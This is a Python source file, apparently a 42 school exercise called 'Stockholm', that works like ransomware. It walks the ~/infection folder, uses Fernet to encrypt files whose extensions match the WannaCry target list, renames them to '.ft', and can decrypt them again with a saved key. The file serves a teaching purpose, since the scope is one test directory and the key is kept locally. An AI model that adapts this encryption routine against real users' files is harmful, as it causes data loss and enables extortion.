# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm                                          :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: cmaurici <cmaurici@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/11 18:16:09 by cmaurici          #+#    #+#              #
#    Updated: 2023/06/01 16:54:32 by cmaurici         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from cryptography.fernet import Fernet
from pathlib import Path
import argparse
import os

infected = str(Path.home()) + "/infection"
version = "Stockholm 1.0"
extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', 
              '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', 
              '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', 
              '.mdb', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cpp', '.pas', 
              '.asm', '.cmd', '.bat', '.ps1', '.vbs', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.java', 
              '.jar', '.class', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', 
              '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.psd', '.nef', 
              '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', 
              '.rar', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', 
              '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', 
              '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', 
              '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', 
              '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc', '.sh']

# First I check if the file is not an important file and it is contained in the wannacry list of affected extensions.
# Also if it's already on the '.ft' format.  

def checker(file, mode):
    if os.path.isfile(file) and file not in ['stockholm.py', 'key.key']:
        if mode == 'encrypt':
            for extension in extensions:
                if file.endswith(extension):
                    return True
        elif mode == 'decrypt':
            if file.endswith('.ft'):
                return True
        else:
            if not args.s:
                print("ERROR: File was not in the wannacry list of affected extensions")
            exit(1)
    return False

# Generate a list with all the files in the directory including subdirectories as long as they exist.

def content(folder):
    if os.path.isdir(folder):
        files = os.listdir(folder)
        if len(files) > 0:
            inventory = []
            for file in files:
                if os.path.isdir(folder + '/'+ file):
                    inventory += content(folder + '/' + file)
                else:
                    inventory.append(folder + '/' + file)
            return inventory
        else:
            return []
    else:
        if not args.s:
            print("ERROR: Directory not found")
        exit (1)                            

# Time to search for files in the "infected" directory, encrypt the content using Fernet encryption and rename the files.
# It also returns the number of encrypted files.

def kidnap():
    files = []
    success = 0
    inventory = content(infected)
    for file in inventory:
        if checker(file, 'encrypt'):
            files.append(file)
    key = Fernet.generate_key()
    open('Key.key', 'wb').write(key)
    if not args.s and files:
        print('Time to kidnap :D')
    for file in files:
        if not args.s:
            print('\t{}'.format(file))
        try:
            encryption = Fernet(key).encrypt(open(file, 'rb').read())
            with open(file, 'wb') as f:
                f.write(encryption)
            os.rename(file, file + '.ft')
            success += 1
        except Exception:
            if not args.s:
                print("ERROR: Could't encrypt file '{}'".format(file))
    if not args.s:
        print("\nEncrypted files:")
        for f in sorted(files):
            print(f"\t{f}")
        print(f"\n\tSummary: {success} of {len(files)} files encrypted")
    return

# Decrypts all files in the directory with the '.ft' extension as long as they weren't already '.ft' files
# Example: pepito.ft.ft

def release():        
    files = []
    success = 0
    inventory = content(infected)
    for file in inventory:
        if checker(file, 'decrypt'):
            files.append(file)
    if not args.s and files:
        print("Encrypted files:")
        for f in sorted(files):
            print(f"{f}")
        print(f"\n\tSummary: {len(files)}\n")
    key = open("Key.key", "rb").read()
    for file in files:
        name = os.path.split(file)[1]
        try:
            decrypted = Fernet(key).decrypt(open(file, 'rb').read())
            with open(file, 'wb') as f:
                f.write(decrypted)
            os.rename(file, file[:-3])
            success += 1
        except Exception:
            if not args.s:
                print(f"ERROR: File {name} couldn't be decrypted")
    if not args.s:
        print(f"\nDecrypted files:")
        for f in sorted(files):
            print(f"{f}")
        print(f"\n\tSummary: {success} of {len(files)} files decrypted")
    return                                                  


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Stockholm program to en/decrypt files in a directory')
    parser.add_argument('-r', metavar='clave', type=str, help= 'reverse the infection using the encryption key')
    parser.add_argument('-v', action='store_true', help='program version')
    parser.add_argument('-s', '-silent', action='store_true', help='shows no information of the process')
    args = parser.parse_args()

    if args.v:
        print(f"Version: {version}")
    elif args.r:
        if os.path.exists('Key.key'):
            release()
        else:
            if not args.s:
                print("MASSIVE ERROR: File 'Key.key' not found")       
    else:    
        if os.path.exists(infected):
            kidnap()
        else:
            if not args.s:
                print(f"ERROR: Directory {infected} doesn't exist")        

# echo $HOME
# unset HOME
# export HOME=/Users/cmaurici